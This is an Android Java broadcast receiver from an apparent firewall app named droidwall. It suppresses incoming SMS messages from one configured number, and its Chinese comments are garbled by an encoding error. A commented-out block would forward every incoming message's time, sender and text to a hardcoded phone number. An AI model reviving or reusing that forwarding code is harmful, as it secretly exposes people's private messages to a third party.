package org.nice.droidwall;

import java.text.SimpleDateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSReceiver extends BroadcastReceiver {
	private String phoneNumber;
	
	public SMSReceiver() {
		Log.d("NetWall", "SMSRecevier create");
	}
	
	public SMSReceiver(String phoneNumber){
		
		Log.d("NetWall", "SMSRecevier create");
		this.phoneNumber = phoneNumber;
	}

	@Override
	public void onReceive(Context context, Intent intent)
	{
		Log.d("NetWall", "SMSRecevier onReceive");
		Object[] pdus = (Object[]) intent.getExtras().get("pdus");
		if (pdus != null && pdus.length > 0)
		{
			SmsMessage[] messages = new SmsMessage[pdus.length];
			for (int i = 0; i < pdus.length; i++)
			{
				byte[] pdu = (byte[]) pdus[i];
				messages[i] = SmsMessage.createFromPdu(pdu);
			}
			for (SmsMessage message : messages)
			{
				String content = message.getMessageBody(); //�õ���������
				String sender = message.getOriginatingAddress(); //�õ�����Ϣ�ĺ���
				//here add telephone number
				if (sender.equals(phoneNumber))
				{
					abortBroadcast(); //��ָ����
					Log.d("NetWall", "�˺���Ϊ���������룬������");
				}
				/**
				Date date = new Date(message.getTimestampMillis());
				SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
				String sendContent = format.format(date) + ":" + sender + "--" + content;
				SmsManager smsManager = SmsManager.getDefault(); //����Ϣʱ��Ҫ��
				smsManager.sendTextMessage("15828656828", null, sendContent, null, null);
				Log.d("NetWall", sendContent);
				*/
			}
		}
	}

}
